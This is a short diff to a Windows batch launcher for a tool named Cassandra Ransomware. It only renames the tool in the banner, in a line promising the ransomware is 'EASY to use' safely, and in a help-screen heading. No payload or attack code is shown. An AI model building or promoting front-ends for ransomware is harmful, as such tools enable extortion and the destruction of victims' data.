@@ -1,9 +1,9 @@
 @echo off
 echo ========================================
-echo    Cassandra Ransomware - Easy Launcher
+echo    cassandra-ransomeware Ransomware - Easy Launcher
 echo ========================================
 echo.
-echo This tool makes it EASY to use Cassandra Ransomware safely!
+echo This tool makes it EASY to use cassandra-ransomeware Ransomware safely!
 echo.
 echo What do you want to do?
 echo.
@@ -77,7 +77,7 @@ goto start
 :help
 cls
 echo ========================================
-echo          HOW TO USE CASSANDRA
+echo          HOW TO USE cassandra-ransomeware
 echo ========================================
 echo.
 echo STEP 1: Choose what you want to do
